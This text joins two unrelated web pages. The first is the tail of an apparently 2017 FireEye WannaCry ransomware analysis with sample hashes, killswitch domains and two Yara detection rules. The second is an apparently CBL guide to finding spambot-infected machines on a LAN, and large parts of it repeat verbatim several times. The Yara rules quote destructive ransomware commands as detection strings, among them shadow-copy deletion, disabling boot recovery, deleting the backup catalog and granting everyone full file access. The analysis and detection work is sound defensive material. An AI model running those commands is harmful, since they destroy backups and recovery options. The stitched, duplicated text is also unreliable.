set to the path of the bitmap and the dialog shown in Figure 6 is then displayed.When the user clicks on the "Contact us" link, the malware sends the message to the Onion server using the following format:Depending on the response from the server, the malware may display a message box with one of the following values:When the user clicks on "Check Payment". The malware first check if the file 00000000.dky is present on the system. If the file is present, it attempts to verify the key by encrypting a file with the key obtained from 00000000.pky and decrypting it with the key obtained from 00000000.dky.If the file is not present, the malware sends the contents of 00000000.eky to the Onion server. The response from the server is saved to 00000000.dky. If the key cannot be validated, the malware displays a message box with the contents:You did not pay or we did not confirmed your payment!
Pay now if you didn't and check again after 2 hours.
Best time to check: 9:00am - 11:00am GMT from Monday to Friday.When the decrypt button is clicked without the ransom being paid, the malware decrypts the files listed in f.wnry. The files listed in f.wnry are those randomly selected to be encrypted with the embedded public key. This process is covered in the Encryption component section above.(MD5: db349b97c37d22f5ea1d1841e3c89eb4)(MD5: 84c82835a5d21bbcf75a61706d8ab549)(MD5: f351e1fcca0c4ea05fc44d15a17f8b36)(MD5: 7bf2b57f2a205768755c07f238fb32cc)The following table contains observed killswitch domains and their associated sample hash.DomainAssociated Sample MD5 Hashiuqssfsodp9ifjaposdfjhgosurijfaewrwergwea.comc2559b51cfd37bdbd5fdb978061c6c16ayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf.com (This domain matches the format of WannaCry-associated domains, but has not yet been clearly linked to a specific sample. Organizations wish to maintain awareness of this domain in the event that it is associated with WannaCry activity.)a44964a7be94072cdfe085bc43e7dc95ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com80ce983d22c6213f35867053bec1c293iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.comdb349b97c37d22f5ea1d1841e3c89eb4iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.test96dff36b5275c67e35097d77a120d0d4FireEye has developed the following Yara rules for WannaCry detection:rule FE_RANSOMWARE_WANNACRY {
            meta:version=".4"
            filetype="PE"
            author="Ian.Ahl@fireeye.com @TekDefense"
            date="2017-05-12"
            description="Generic detection for most WannaCry variants"
strings:
            // Bitcoin URLs
            $bcURL1 = "http://www.btcfrog.com/qr/bitcoinPNG.php?address=%" ascii wide nocase
            $bcURL2 = "https://www.google.com/search?q=how+to+buy+bitcoin" ascii wide nocase            // Ransom Message
            $msg1 = "Congratulations! Succeed to check your payment!" ascii wide
            $msg2 = "Start decrypting now!" ascii wide
            $msg3 = "All your files have been decrypted!" ascii wide
            $msg4 = "Pay now, if you want to decrypt ALL your files!" ascii wide
            $msg5 = "Send $%d worth of bitcoin to this address:" ascii wide
            $msg6 = "Ooops, your files have been encrypted!" ascii wide            // WANNA Strings
            $wanna1 = "Wanna Decryptor 1.0" ascii wide
            $wanna2 = "Wana Decrypt0r" ascii wide
            $wanna3 = "Wana Decryptor" ascii wide
            $wanna4 = "WANNACRY" ascii wide nocase
            $wanna5 = "WanaCrypt0r" ascii wide nocase
            $wanna6 = "WANACRY!" ascii wide
            $wanna7 = "WNcry@2ol7" ascii wide
            $wanna8 = "wcry@123"
            $wanna9 = "wcry@2016"            // File references
            $fileA1 = "!WannaCryptor!.bmp" ascii wide
            $fileA2 = "!WannaDecryptor!.exe.lnk" ascii wide
            $fileA3 = "!Please Read Me!.txt" ascii wide            $fileB1 = "@WanaDecryptor@.bmp" ascii wide
            $fileB2 = "@WanaDecryptor@.exe.lnk" ascii wide
            $fileB3 = "@Please_Read_Me@.txt" ascii wide            // CMDS
            $cmd1 = "cmd.exe /c start /b vssadmin.exe Delete Shadows /All /Quiet" ascii wide nocase
            $cmd2 = "wmic shadowcopy delete" ascii wide
            $cmd3 = "bcdedit /set {default} bootstatuspolicy ignoreallfailures" ascii wide
            $cmd4 = "bcdedit /set {default} recoveryenabled no" ascii wide
            $cmd5 = "wbadmin delete catalog -quiet" ascii wide
            $cmd6 = "icacls . /grant Everyone:F /T /C /Q" ascii wide            // MISC
            $misc1 = "StartTask" wide ascii
            $misc2 = "b.wry" wide ascii
            $misc3 = "c.wry" wide ascii
            $misc4 = "m.wry" wide ascii
            $misc5 = "inflate 1.1.3 Copyright 1995-1998 Mark Adler" wide ascii
            $misc6 = "?AVtype_info@@" wide asciicondition:
            (
                        (
                                    (uint16(0) == 0x5A4D)
                        )
                        and
                        (
                                    all of ($fileA*)
                                    or
                                    all of ($fileB*)
                                    or
                                    (4 of ($msg*) and 2 of ($bcURL*))
                                    or
                                    2 of ($wanna*)
                                    or
                                    (2 of ($msg*) and 1 of ($cmd*))
                                    or
                                    4 of ($cmd*)
                                    or
                                    (1 of ($wanna*) and 1 of ($cmd*))
                                    or
                                    (1 of ($wanna*) and 3 of ($misc*))
                        )
            )
}rule FE_RANSOMWARE_WANNACRY_EB {
           meta:version=".1"
           filetype="PE"
           author="Ian.Ahl@fireeye.com @TekDefense"
           date="2017-05-12"
           description="Focusing on the WannaCry variants with worm capabilities"
strings:            // EB related strings in WANNACRY
            $eb1 = "__USERID__PLACEHOLDER__@" ascii wide
            $eb2 = "__TREEID__PLACEHOLDER__" ascii wide
            $eb3 = "LANMAN1.0" ascii wide
            $eb4 = "LANMAN2.1" ascii wide
            $eb5 = "\\PIPE\\" ascii wide
            $eb6 = "\\\\%s\\IPC$" ascii wide
            $eb7 = "__TREEPATH_REPLACE__" ascii wide
            $eb8 = "/K__USERID__PLACEHOLDER__" ascii widecondition:
            (
                        (
                                    (uint16(0) == 0x5A4D)
                        )
                        and
                        (
                                    all of ($eb*)
                        )
            )
} 

This entry was posted on Tue May 23 13:30 EDT 2017 and filed under Ransomware, Malware Analysis, Randi Eitzman, Josh Homan, WannaCry Ransomware, and Alex Berry.

Get information and insight on today's advanced threats from the leader in advanced threat prevention.CompanyNews and EventsTechnical SupportFireEye BlogsThreat MapContact Us


+1 877-347-3393 

Stay Connected
Copyright © 2018 FireEye, Inc. All rights reserved. Privacy & Cookies Policy | Privacy Shield | Legal Documentation
My preferred language:

If you have been directed to this page for a "sinkhole malware" detection,
such as Zeus, Spyeye, TDSS, or Torpig, be aware that these are NOT
detected by port 25 traffic.
The CBL lookup for these detections will generally tell you which port
the detection was on, and the IPs where the infected machine connected to.
With these detections, we're detecting traffic on ports other
than port 25.
Therefore, when reading this page for those listings, keep in mind these
are not port 25 (usually port 443, 8800, 80 etc), and you should be looking
for ANY traffic to the IPs mentioned in the lookup page.

THIS DOCUMENT IS UNDER DEVELOPMENT.
Comments are welcome.

Many times people have a CBL listing that corresponds to the
NAT or PAT for a LAN, and it can be
EXTREMELY difficult identifying the infected machine.
This page mentions a number of simple-to-advanced methods
for identifying infected
machines on a LAN.
Many are methods that non-technical people may well not understand
nor be able to conveniently implement.

Your first line of defence if you use a NAT or PAT firewall is to
make sure that your NAT does not allow inbound or outbound port 25
connections _except_ to your mail server (if you have one).

But whether or not your NAT is secured, you will still need to be
able to find the infected machine.

This page is intended for a broad range of levels of experience.
Both network neophytes and experts should be able to find useful
tidbits of
information in it.

Some of these methods are relatively easy for anyone to use, so we'll
mention them with brief discussions on how to use them.

Other methods really aren't suitable for network neophytes.
We mention them in passing so that if you are capable of doing them,
or can hire a consultant who can, you/they will know what to look for.

These methods are mostly independent of what kinds of computers
or operating systems you're using.  The tool names may change between,
say, Linux and Windows, but you're looking for the same things.
In the discussions below, we'll refer to
UNIX/Linux/MacOS/FreeBSD/Solaris/AIX/NetBSD/etc as "*NIX".

The author has taken a stab at identifying which methods are easy,
moderately difficult or hard by something like this: "[HARD]".

Within each of the two sections (per-machine and centralized) we present
them in an "easy to harder" order.  Review them in order to find out
which will be the most appropriate for you to use.

But before you try to find out what machine it is,
SECURE YOUR NAT.
What will Anti-Virus (A/V) software do for me?

Basically, not much.


These days most bot infections cannot be found by anti-virus
"cleaners", or at least not without having to try a dozen or
more of them.
This means you can expend a considerable amount of time and effort
running your A/V tools on every machine on your LAN and find absolutely
nothing.
Or find something that has nothing whatsoever to do with the CBL listing.


For another voice on current A/V effectiveness see
Gary Warner's blog.
One of the additional things that Gary omitted mentioning is that
of "polymorphic viruses".
Signature-based A/V works by taking a MD5 hash (a checksum) of the
malicious program, and saving the hash as the "signature".  Then,
whenever anyone else sees a file with the same MD5 hash, they know
its the same file, and hence the same malware.
Problem is that there are an infinite number of ways that an executable
program can be "packed" on disk.
In the old days, the virus would be packed once, and distributed that way.
These days, the virus downloaders have the capability of changing
the packing every time the file is downloaded.  Meaning you'd need
an infinite number of MD5 hashes to catch it.
And if you've not seen that particular packing before (you may be
the only person who'll ever get that packing), then, you
won't have an MD5 hash for it.


There's another breed of virus scanners which "decode" the program
and try to figure out what it's going to do - "behavioral detection".
These aren't very good yet, and they're very very slow.  But we're
hoping they'll get there.


As a consequence of all this, even if you did know which machine was
infected, the A/V tools wouldn't fix them.


The result basically being that A/V tools can't be used to find which
machine is infected, and even if you did know which machine was infected,
you can't successfully clean it, you have to reinstall your software.


Ugly?  Yes.  Frustrating?  Yes.
But that's how things are now.


This document focusses on how to find the infected machine.
Once you have found it, you generally will have to reinstall it.

What am I looking for?

The essential goal of this exercise is to figure out which
computer is infected and sending email.


The methods we describe here are how to find out which machine is sending
lots of email. 
You will be looking for direct evidence that a particular computer
is sending email it shouldn't be, OR, indirect evidence that it
is doing it.


Particularly in a large network (with 100s or 1000s of computers)
you will want a "central detection" method.
In other words, you look in one place, and it tells you which computer
is sending lots of email.


We discuss a number of methods under the "Centralized Detection"
section below, however, many of these require significant network
monitoring/admin expertise and/or testing hardware.
Environments run by professional network engineers
are frequently able to do these as a normal course
of events, but this is seldom the case in a small business or
home network.
Though, a small business should be able to hire a consultant
who could use some of these methods.


The simplest methods under Centralized Detection are using a
network sniffer or firewall logging.


Depending on how your network is set up, a network
sniffer won't work without considerable extra effort.
This is because modern higher performance networking gear makes
network sniffing quite difficult.


If your LAN uses an ethernet hub (not a network switch or
router), OR, your firewall IS a generalized
computer (eg: Linux or Windows server acting as a firewall)
go directly to the port 25 sniffing section below.
If you're not using a hub, sniffing is still possible, but it's
harder, and using one of the per-machine methods may be simpler.


If you have a decent firewall that has logging capabilities,
go to the section on Firewall logging.

What am I NOT looking for?

CBL listing criteria is very narrow:


The CBL does not test nor list open relays.
DO NOT waste your time with open relay testers.
We keep telling people this, and they keep doing it anyway - drives
us crazy.

OPEN RELAY HAS NOTHING TO DO WITH THE CBL, so do not
waste your or our time with telling us about open relay testing you
passed.
It's good that you're not an open relay.  But we don't list open relays.


The CBL doesn't care what your DNS is.  Really.  The CBL won't list
you if you don't have DNS or don't have rDNS (PTR value)
or have "odd" DNS or rDNS values.
In some cases, the rDNS is used as the HELO by your mail server,
The CBL often cares about HELO.
in which case you can fix it by either explicitly configuring your
mail server to override the rDNS value, or have the rDNS value changed
to something more "normal".


Under normal circumstances, the rDNS doesn't matter, so don't
change it until you're sure you understand
why
it will matter.




The CBL doesn't care if you have SPF or don't have SPF.
The CBL doesn't care if you have DKIM or don't have DKIM.
The CBL doesn't care if you have DMARC or don't have DMARC.
x


But I can't find strange/spam emails in my mail server logs!
Don't bother looking in your mail server logs.
The things that the CBL catch do NOT go through normal mail servers.
They have their own SMTP client, and connect directly to the recipient's
mail server.
Your mail server logs will show nothing.
Really, truly, your server logs will NOT show BOT traffic..

Don't waste your or our time by looking in your mail server logs.


As mentioned above, sometimes the CBL cares about HELO value.
But you cannot tell what the HELO value is by
telnetting on port 25 to your mail server.
What you see when you telnet to the mail server is the "banner".
What your machine uses as the HELO/EHLO parameter when it makes
an outbound connection is the "HELO".
You can test the HELO by seeing the helo testing procedure.
But that only tests your real mail server.
If that confirms that the HELO is strange, you're lucky, and you
just have to fix it in the mail server configuration.
But often it won't - meaning that there is some other
program on your computer making email connections with its own HELO.
Finding that "other program" is the hard part - it's probably a BOT
trying to hide.


So, don't waste your time by telnetting to your mail server
and telling us that the banner was already okay, or that
the the helo testing procedure gave
the right helo.
If it is okay, it's NOT why the CBL listed it.



As we describe in What will A/V software do for me?
running an A/V tool or two on your machines doesn't mean anything.
The success rate of A/V tools in finding modern spambot infections
is very low.  In fact: horrible, bad, frightening and 
almost completely and totally useless.


Therefore, an A/V tool saying your computer is "clean" doesn't mean anything
anymore.  Sorry, but that's just how it is these days.
You may get lucky and a new or updated A/V tool might just find it.
But don't count on it.


Within each of the two sections (per-machine and centralized) we present
them in an "easy to harder" order.  Review them in order to find out
which will be the most appropriate for you to use.

But before you try to find out what machine it is,
SECURE YOUR NAT.
What will Anti-Virus (A/V) software do for me?

Basically, not much.


These days most bot infections cannot be found by anti-virus
"cleaners", or at least not without having to try a dozen or
more of them.
This means you can expend a considerable amount of time and effort
running your A/V tools on every machine on your LAN and find absolutely
nothing.
Or find something that has nothing whatsoever to do with the CBL listing.


For another voice on current A/V effectiveness see
Gary Warner's blog.
One of the additional things that Gary omitted mentioning is that
of "polymorphic viruses".
Signature-based A/V works by taking a MD5 hash (a checksum) of the
malicious program, and saving the hash as the "signature".  Then,
whenever anyone else sees a file with the same MD5 hash, they know
its the same file, and hence the same malware.
Problem is that there are an infinite number of ways that an executable
program can be "packed" on disk.
In the old days, the virus would be packed once, and distributed that way.
These days, the virus downloaders have the capability of changing
the packing every time the file is downloaded.  Meaning you'd need
an infinite number of MD5 hashes to catch it.
And if you've not seen that particular packing before (you may be
the only person who'll ever get that packing), then, you
won't have an MD5 hash for it.


There's another breed of virus scanners which "decode" the program
and try to figure out what it's going to do - "behavioral detection".
These aren't very good yet, and they're very very slow.  But we're
hoping they'll get there.


As a consequence of all this, even if you did know which machine was
infected, the A/V tools wouldn't fix them.


The result basically being that A/V tools can't be used to find which
machine is infected, and even if you did know which machine was infected,
you can't successfully clean it, you have to reinstall your software.


Ugly?  Yes.  Frustrating?  Yes.
But that's how things are now.


This document focusses on how to find the infected machine.
Once you have found it, you generally will have to reinstall it.

What am I looking for?

The essential goal of this exercise is to figure out which
computer is infected and sending email.


The methods we describe here are how to find out which machine is sending
lots of email. 
You will be looking for direct evidence that a particular computer
is sending email it shouldn't be, OR, indirect evidence that it
is doing it.


Particularly in a large network (with 100s or 1000s of computers)
you will want a "central detection" method.
In other words, you look in one place, and it tells you which computer
is sending lots of email.


We discuss a number of methods under the "Centralized Detection"
section below, however, many of these require significant network
monitoring/admin expertise and/or testing hardware.
Environments run by professional network engineers
are frequently able to do these as a normal course
of events, but this is seldom the case in a small business or
home network.
Though, a small business should be able to hire a consultant
who could use some of these methods.


The simplest methods under Centralized Detection are using a
network sniffer or firewall logging.


Depending on how your network is set up, a network
sniffer won't work without considerable extra effort.
This is because modern higher performance networking gear makes
network sniffing quite difficult.


If your LAN uses an ethernet hub (not a network switch or
router), OR, your firewall IS a generalized
computer (eg: Linux or Windows server acting as a firewall)
go directly to the port 25 sniffing section below.
If you're not using a hub, sniffing is still possible, but it's
harder, and using one of the per-machine methods may be simpler.


If you have a decent firewall that has logging capabilities,
go to the section on Firewall logging.

What am I NOT looking for?

CBL listing criteria is very narrow:


The CBL does not test nor list open relays.
DO NOT waste your time with open relay testers.
We keep telling people this, and they keep doing it anyway - drives
us crazy.

OPEN RELAY HAS NOTHING TO DO WITH THE CBL, so do not
waste your or our time with telling us about open relay testing you
passed.
It's good that you're not an open relay.  But we don't list open relays.


The CBL doesn't care what your DNS is.  Really.  The CBL won't list
you if you don't have DNS or don't have rDNS (PTR value)
or have "odd" DNS or rDNS values.
In some cases, the rDNS is used as the HELO by your mail server,
The CBL often cares about HELO.
in which case you can fix it by either explicitly configuring your
mail server to override the rDNS value, or have the rDNS value changed
to something more "normal".


Under normal circumstances, the rDNS doesn't matter, so don't
change it until you're sure you understand
why
it will matter.




The CBL doesn't care if you have SPF or don't have SPF.
The CBL doesn't care if you have DKIM or don't have DKIM.
The CBL doesn't care if you have DMARC or don't have DMARC.
x


But I can't find strange/spam emails in my mail server logs!
Don't bother looking in your mail server logs.
The things that the CBL catch do NOT go through normal mail servers.
They have their own SMTP client, and connect directly to the recipient's
mail server.
Your mail server logs will show nothing.
Really, truly, your server logs will NOT show BOT traffic..

Don't waste your or our time by looking in your mail server logs.


As mentioned above, sometimes the CBL cares about HELO value.
But you cannot tell what the HELO value is by
telnetting on port 25 to your mail server.
What you see when you telnet to the mail server is the "banner".
What your machine uses as the HELO/EHLO parameter when it makes
an outbound connection is the "HELO".
You can test the HELO by seeing the helo testing procedure.
But that only tests your real mail server.
If that confirms that the HELO is strange, you're lucky, and you
just have to fix it in the mail server configuration.
But often it won't - meaning that there is some other
program on your computer making email connections with its own HELO.
Finding that "other program" is the hard part - it's probably a BOT
trying to hide.


So, don't waste your time by telnetting to your mail server
and telling us that the banner was already okay, or that
the the helo testing procedure gave
the right helo.
If it is okay, it's NOT why the CBL listed it.



As we describe in What will A/V software do for me?
running an A/V tool or two on your machines doesn't mean anything.
The success rate of A/V tools in finding modern spambot infections
is very low.  In fact: horrible, bad, frightening and 
almost completely and totally useless.


Therefore, an A/V tool saying your computer is "clean" doesn't mean anything
anymore.  Sorry, but that's just how it is these days.
You may get lucky and a new or updated A/V tool might just find it.
But don't count on it.


But before you try to find out what machine it is,
SECURE YOUR NAT.
What will Anti-Virus (A/V) software do for me?

Basically, not much.


These days most bot infections cannot be found by anti-virus
"cleaners", or at least not without having to try a dozen or
more of them.
This means you can expend a considerable amount of time and effort
running your A/V tools on every machine on your LAN and find absolutely
nothing.
Or find something that has nothing whatsoever to do with the CBL listing.


For another voice on current A/V effectiveness see
Gary Warner's blog.
One of the additional things that Gary omitted mentioning is that
of "polymorphic viruses".
Signature-based A/V works by taking a MD5 hash (a checksum) of the
malicious program, and saving the hash as the "signature".  Then,
whenever anyone else sees a file with the same MD5 hash, they know
its the same file, and hence the same malware.
Problem is that there are an infinite number of ways that an executable
program can be "packed" on disk.
In the old days, the virus would be packed once, and distributed that way.
These days, the virus downloaders have the capability of changing
the packing every time the file is downloaded.  Meaning you'd need
an infinite number of MD5 hashes to catch it.
And if you've not seen that particular packing before (you may be
the only person who'll ever get that packing), then, you
won't have an MD5 hash for it.


There's another breed of virus scanners which "decode" the program
and try to figure out what it's going to do - "behavioral detection".
These aren't very good yet, and they're very very slow.  But we're
hoping they'll get there.


As a consequence of all this, even if you did know which machine was
infected, the A/V tools wouldn't fix them.


The result basically being that A/V tools can't be used to find which
machine is infected, and even if you did know which machine was infected,
you can't successfully clean it, you have to reinstall your software.


Ugly?  Yes.  Frustrating?  Yes.
But that's how things are now.


This document focusses on how to find the infected machine.
Once you have found it, you generally will have to reinstall it.

What am I looking for?

The essential goal of this exercise is to figure out which
computer is infected and sending email.


The methods we describe here are how to find out which machine is sending
lots of email. 
You will be looking for direct evidence that a particular computer
is sending email it shouldn't be, OR, indirect evidence that it
is doing it.


Particularly in a large network (with 100s or 1000s of computers)
you will want a "central detection" method.
In other words, you look in one place, and it tells you which computer
is sending lots of email.


We discuss a number of methods under the "Centralized Detection"
section below, however, many of these require significant network
monitoring/admin expertise and/or testing hardware.
Environments run by professional network engineers
are frequently able to do these as a normal course
of events, but this is seldom the case in a small business or
home network.
Though, a small business should be able to hire a consultant
who could use some of these methods.


The simplest methods under Centralized Detection are using a
network sniffer or firewall logging.


Depending on how your network is set up, a network
sniffer won't work without considerable extra effort.
This is because modern higher performance networking gear makes
network sniffing quite difficult.


If your LAN uses an ethernet hub (not a network switch or
router), OR, your firewall IS a generalized
computer (eg: Linux or Windows server acting as a firewall)
go directly to the port 25 sniffing section below.
If you're not using a hub, sniffing is still possible, but it's
harder, and using one of the per-machine methods may be simpler.


If you have a decent firewall that has logging capabilities,
go to the section on Firewall logging.

What am I NOT looking for?

CBL listing criteria is very narrow:


The CBL does not test nor list open relays.
DO NOT waste your time with open relay testers.
We keep telling people this, and they keep doing it anyway - drives
us crazy.

OPEN RELAY HAS NOTHING TO DO WITH THE CBL, so do not
waste your or our time with telling us about open relay testing you
passed.
It's good that you're not an open relay.  But we don't list open relays.


The CBL doesn't care what your DNS is.  Really.  The CBL won't list
you if you don't have DNS or don't have rDNS (PTR value)
or have "odd" DNS or rDNS values.
In some cases, the rDNS is used as the HELO by your mail server,
The CBL often cares about HELO.
in which case you can fix it by either explicitly configuring your
mail server to override the rDNS value, or have the rDNS value changed
to something more "normal".


Under normal circumstances, the rDNS doesn't matter, so don't
change it until you're sure you understand
why
it will matter.




The CBL doesn't care if you have SPF or don't have SPF.
The CBL doesn't care if you have DKIM or don't have DKIM.
The CBL doesn't care if you have DMARC or don't have DMARC.
x


But I can't find strange/spam emails in my mail server logs!
Don't bother looking in your mail server logs.
The things that the CBL catch do NOT go through normal mail servers.
They have their own SMTP client, and connect directly to the recipient's
mail server.
Your mail server logs will show nothing.
Really, truly, your server logs will NOT show BOT traffic..

Don't waste your or our time by looking in your mail server logs.


As mentioned above, sometimes the CBL cares about HELO value.
But you cannot tell what the HELO value is by
telnetting on port 25 to your mail server.
What you see when you telnet to the mail server is the "banner".
What your machine uses as the HELO/EHLO parameter when it makes
an outbound connection is the "HELO".
You can test the HELO by seeing the helo testing procedure.
But that only tests your real mail server.
If that confirms that the HELO is strange, you're lucky, and you
just have to fix it in the mail server configuration.
But often it won't - meaning that there is some other
program on your computer making email connections with its own HELO.
Finding that "other program" is the hard part - it's probably a BOT
trying to hide.


So, don't waste your time by telnetting to your mail server
and telling us that the banner was already okay, or that
the the helo testing procedure gave
the right helo.
If it is okay, it's NOT why the CBL listed it.



As we describe in What will A/V software do for me?
running an A/V tool or two on your machines doesn't mean anything.
The success rate of A/V tools in finding modern spambot infections
is very low.  In fact: horrible, bad, frightening and 
almost completely and totally useless.


Therefore, an A/V tool saying your computer is "clean" doesn't mean anything
anymore.  Sorry, but that's just how it is these days.
You may get lucky and a new or updated A/V tool might just find it.
But don't count on it.


Basically, not much.

These days most bot infections cannot be found by anti-virus
"cleaners", or at least not without having to try a dozen or
more of them.
This means you can expend a considerable amount of time and effort
running your A/V tools on every machine on your LAN and find absolutely
nothing.
Or find something that has nothing whatsoever to do with the CBL listing.

For another voice on current A/V effectiveness see
Gary Warner's blog.
One of the additional things that Gary omitted mentioning is that
of "polymorphic viruses".
Signature-based A/V works by taking a MD5 hash (a checksum) of the
malicious program, and saving the hash as the "signature".  Then,
whenever anyone else sees a file with the same MD5 hash, they know
its the same file, and hence the same malware.
Problem is that there are an infinite number of ways that an executable
program can be "packed" on disk.
In the old days, the virus would be packed once, and distributed that way.
These days, the virus downloaders have the capability of changing
the packing every time the file is downloaded.  Meaning you'd need
an infinite number of MD5 hashes to catch it.
And if you've not seen that particular packing before (you may be
the only person who'll ever get that packing), then, you
won't have an MD5 hash for it.

There's another breed of virus scanners which "decode" the program
and try to figure out what it's going to do - "behavioral detection".
These aren't very good yet, and they're very very slow.  But we're
hoping they'll get there.

As a consequence of all this, even if you did know which machine was
infected, the A/V tools wouldn't fix them.

The result basically being that A/V tools can't be used to find which
machine is infected, and even if you did know which machine was infected,
you can't successfully clean it, you have to reinstall your software.

Ugly?  Yes.  Frustrating?  Yes.
But that's how things are now.

This document focusses on how to find the infected machine.
Once you have found it, you generally will have to reinstall it.

The essential goal of this exercise is to figure out which
computer is infected and sending email.

The methods we describe here are how to find out which machine is sending
lots of email. 
You will be looking for direct evidence that a particular computer
is sending email it shouldn't be, OR, indirect evidence that it
is doing it.

Particularly in a large network (with 100s or 1000s of computers)
you will want a "central detection" method.
In other words, you look in one place, and it tells you which computer
is sending lots of email.

We discuss a number of methods under the "Centralized Detection"
section below, however, many of these require significant network
monitoring/admin expertise and/or testing hardware.
Environments run by professional network engineers
are frequently able to do these as a normal course
of events, but this is seldom the case in a small business or
home network.
Though, a small business should be able to hire a consultant
who could use some of these methods.

The simplest methods under Centralized Detection are using a
network sniffer or firewall logging.

Depending on how your network is set up, a network
sniffer won't work without considerable extra effort.
This is because modern higher performance networking gear makes
network sniffing quite difficult.

If your LAN uses an ethernet hub (not a network switch or
router), OR, your firewall IS a generalized
computer (eg: Linux or Windows server acting as a firewall)
go directly to the port 25 sniffing section below.
If you're not using a hub, sniffing is still possible, but it's
harder, and using one of the per-machine methods may be simpler.

If you have a decent firewall that has logging capabilities,
go to the section on Firewall logging.

CBL listing criteria is very narrow:


The CBL does not test nor list open relays.
DO NOT waste your time with open relay testers.
We keep telling people this, and they keep doing it anyway - drives
us crazy.

OPEN RELAY HAS NOTHING TO DO WITH THE CBL, so do not
waste your or our time with telling us about open relay testing you
passed.
It's good that you're not an open relay.  But we don't list open relays.


The CBL doesn't care what your DNS is.  Really.  The CBL won't list
you if you don't have DNS or don't have rDNS (PTR value)
or have "odd" DNS or rDNS values.
In some cases, the rDNS is used as the HELO by your mail server,
The CBL often cares about HELO.
in which case you can fix it by either explicitly configuring your
mail server to override the rDNS value, or have the rDNS value changed
to something more "normal".


Under normal circumstances, the rDNS doesn't matter, so don't
change it until you're sure you understand
why
it will matter.




The CBL doesn't care if you have SPF or don't have SPF.
The CBL doesn't care if you have DKIM or don't have DKIM.
The CBL doesn't care if you have DMARC or don't have DMARC.
x


But I can't find strange/spam emails in my mail server logs!
Don't bother looking in your mail server logs.
The things that the CBL catch do NOT go through normal mail servers.
They have their own SMTP client, and connect directly to the recipient's
mail server.
Your mail server logs will show nothing.
Really, truly, your server logs will NOT show BOT traffic..

Don't waste your or our time by looking in your mail server logs.


As mentioned above, sometimes the CBL cares about HELO value.
But you cannot tell what the HELO value is by
telnetting on port 25 to your mail server.
What you see when you telnet to the mail server is the "banner".
What your machine uses as the HELO/EHLO parameter when it makes
an outbound connection is the "HELO".
You can test the HELO by seeing the helo testing procedure.
But that only tests your real mail server.
If that confirms that the HELO is strange, you're lucky, and you
just have to fix it in the mail server configuration.
But often it won't - meaning that there is some other
program on your computer making email connections with its own HELO.
Finding that "other program" is the hard part - it's probably a BOT
trying to hide.


So, don't waste your time by telnetting to your mail server
and telling us that the banner was already okay, or that
the the helo testing procedure gave
the right helo.
If it is okay, it's NOT why the CBL listed it.



As we describe in What will A/V software do for me?
running an A/V tool or two on your machines doesn't mean anything.
The success rate of A/V tools in finding modern spambot infections
is very low.  In fact: horrible, bad, frightening and 
almost completely and totally useless.

OPEN RELAY HAS NOTHING TO DO WITH THE CBL, so do not
waste your or our time with telling us about open relay testing you
passed.
It's good that you're not an open relay.  But we don't list open relays.


Under normal circumstances, the rDNS doesn't matter, so don't
change it until you're sure you understand
why
it will matter.

x
Don't waste your or our time by looking in your mail server logs.


So, don't waste your time by telnetting to your mail server
and telling us that the banner was already okay, or that
the the helo testing procedure gave
the right helo.
If it is okay, it's NOT why the CBL listed it.


Therefore, an A/V tool saying your computer is "clean" doesn't mean anything
anymore.  Sorry, but that's just how it is these days.
You may get lucky and a new or updated A/V tool might just find it.
But don't count on it.

The methods in this section require that you check out each computer in your LAN
individually.

If you have a number of machines to check, particularly windows machines, we
recommend downloading some of the tools we mention (or others you may find)
and put them on a USB key.
Then you can go from machine to machine, plugging in the USB key, and
running each of the tools without too much difficulty.
We recommend trying the tools mentioned here before spending lots of
time with A/V scanners.

If you don't want to download anything, you can use Windows netstat
(see the next section) instead.
tcpview's display makes it a bit easier to find viruses, but,
basically netstat is the same thing.
This seems to be standard on Windows.

tcpview and tcpvcon are windows and and command-line based versions
of something similar to *NIX netstat.
These are good tools to have on a USB key "toolkit".

Navigate to where you've placed tcpview (perhaps on a USB key),
and run it.
It will display all of the programs that have network connections open - naming
the program, protocol, local address and port, remote address and port and state.

You're looking for lines that have the remote address say ":smtp" or ":25", representing
a remote email connection.
A machine should not have any of these except when it's actively sending email.
On an end-user desktop, there shouldn't be any at all unless the user is sending
an email at the time.

It's often a good idea to shut down the user's mail reader and other unnecessary
programs (like browsers etc) when you're doing this so you don't get confused
with a flood of irrelevant information.  However, some BOTs actually run inside
mail readers (especially Outlook), so you should try first with the mail reader
shut down, and if you don't find anything, start it up again and watch some more.

When a connection is freshly established, the corresponding line is green.  When
the connection ends, it's shown in red briefly before disppearing.


If you have found the machine with a high volume bot, which could be
sending dozens or hundreds of emails per minute, the display will light up like a
christmas tree with large numbers of green ":smtp" lines appearing and red ":smtp"
lines disappearing very rapidly.
The bot may be deliberately slow, and only send emails sporadically.  So watch
the display for a few minutes to see if any ":smtp" lines show up and disappear.


If you find the machine with the bot showing up on tcpview, the temptation is
strong to simply delete the corresponding program.
Don't.
Chances are high that it's an infection inside a legitimate windows program -
deleting it will cripple the machine, or, that there is software in place to
replace it after you have removed it.


Instead, obtain and run as many anti-virus programs as you can, and see if any
detect or remove it.
After this, reboot the machine, and run tcpview again.  Watch it for a while.
If the problem recurs, you will have to reinstall the computer from scratch.


Note: There are a few bots this won't work with - Srizbi and Xarvester have their
own TCP stacks, and it's believed that tcpview won't see their activity.

Netstat (*NIX and Windows) [EASY-MEDIUM]

Netstat is similar in intent to the tcpvcon version of tcpview, and is standard
on most versions of *NIX - it's been around for decades.
Secondly, most versions of Windows have it.
The main difference with tcpview is that netstat is a command line function
that takes a single snapshot of current connections.


In many versions of netstat, the most effective command line to use is:

netstat -nap


Which could, in the case of Darkmailer, show an active infection like this:

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      1 192.168.2.2:58246       212.69.102.240:25       SYN_SENT    12614/b.pl
tcp        0      0 192.168.2.2:35843       209.85.201.27:25        ESTABLISHED 7996/ciwhcnsb.pl
tcp        0      0 192.168.2.2:53051       81.13.48.2:25           TIME_WAIT   -
tcp        0      0 192.168.2.2:53623       77.243.121.126:25       TIME_WAIT   -
tcp        0      0 192.168.2.2:57816       217.13.210.81:25        TIME_WAIT   -
tcp        0      1 192.168.2.2:50531       217.16.16.81:25         SYN_SENT    12270/nxhbo.pl
tcp        0      0 192.168.2.2:52437       217.198.11.26:25        TIME_WAIT   -
tcp        0      1 192.168.2.2:50140       195.64.222.2:25         SYN_SENT    9273/yzezihd.pl


